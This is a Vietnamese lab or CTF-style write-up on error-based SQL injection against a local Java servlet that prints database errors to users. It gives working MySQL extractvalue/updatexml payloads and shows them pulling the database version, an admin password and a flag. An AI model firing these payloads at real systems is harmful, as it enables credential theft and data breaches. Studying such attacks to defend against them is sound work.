# ⚠️ Kỹ thuật Khai thác: Error-based SQL Injection

## 1. Bản chất Lỗ hổng
Kỹ thuật **Error-based SQL Injection** được sử dụng khi ứng dụng web không hiển thị trực tiếp dữ liệu từ câu lệnh `SELECT` (hoặc cấu trúc bảng không thuận lợi cho `UNION`), nhưng lại có cấu hình xử lý ngoại lệ bất cẩn: **in trực tiếp thông báo lỗi của cơ sở dữ liệu (`SQLException.getMessage()`) ra giao diện người dùng**.

Tại `SearchServlet.java`:
```java
catch (SQLException e) {
    req.setAttribute("sqlError", e.getMessage()); // Rò rỉ thông báo lỗi ra view!
    req.getRequestDispatcher("/result.jsp").forward(req, resp);
}
```

## 2. Cơ chế Khai thác với MySQL XPath Functions
Trên MySQL, các hàm xử lý tài liệu XML như:
- `extractvalue(xml_frag, xpath_expr)`
- `updatexml(xml_target, xpath_expr, new_xml)`

sẽ ném ra lỗi cú pháp XPath nếu chuỗi `xpath_expr` chứa các ký tự không hợp lệ theo chuẩn XPath. Kẻ tấn công lợi dụng đặc điểm này bằng cách chèn ký tự phân cách (ví dụ ký tự dấu ngã `~` có mã hex là `0x7e`) cùng với kết quả của câu lệnh truy vấn con (subquery).

Khi MySQL phân tích cú pháp biểu thức XPath:
```sql
extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e))
```
MySQL nhận thấy chuỗi bắt đầu bằng `~8.0.36~` là biểu thức XPath không hợp lệ và ném ra lỗi:
```
XPATH syntax error: '~8.0.36~'
```
Thông báo lỗi này mang theo chính xác kết quả của câu lệnh con mà kẻ tấn công muốn đọc lén!

## 3. Quy trình Khai thác Từng bước
1. Mở trang tìm kiếm: `http://localhost:8080/search.jsp`.
2. Trích xuất phiên bản MySQL:
   ```sql
   ' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- 
   ```
   Kết quả hiển thị trên màn hình:
   `XPATH syntax error: '~8.0.36~'`
3. Trích xuất mật khẩu của Admin:
   ```sql
   ' AND updatexml(1, concat(0x7e, (SELECT password FROM users WHERE username='admin'), 0x7e), 1) -- 
   ```
   Kết quả:
   `XPATH syntax error: '~SuperSecretAdminP@ssw0rd2026!~'`
4. Trích xuất Flag:
   ```sql
   ' AND extractvalue(1, concat(0x7e, (SELECT secret_flag FROM users WHERE username='admin'), 0x7e)) -- 
   ```
   Kết quả:
   `XPATH syntax error: '~FLAG{sqli_admin_bypass_master_~'`

> **Lưu ý kỹ thuật:** Hàm `extractvalue` và `updatexml` giới hạn chuỗi hiển thị tối đa 32 ký tự. Để lấy toàn bộ các chuỗi dài hơn 32 ký tự, ta sử dụng hàm `SUBSTRING(string, offset, length)` để đọc từng phần.

## 4. Chạy Script khai thác tự động
```bash
python exploit.py
```
Script sẽ gửi các payload và dùng Regular Expression tự động trích xuất chuỗi nằm giữa 2 dấu `~` trong thông báo lỗi.
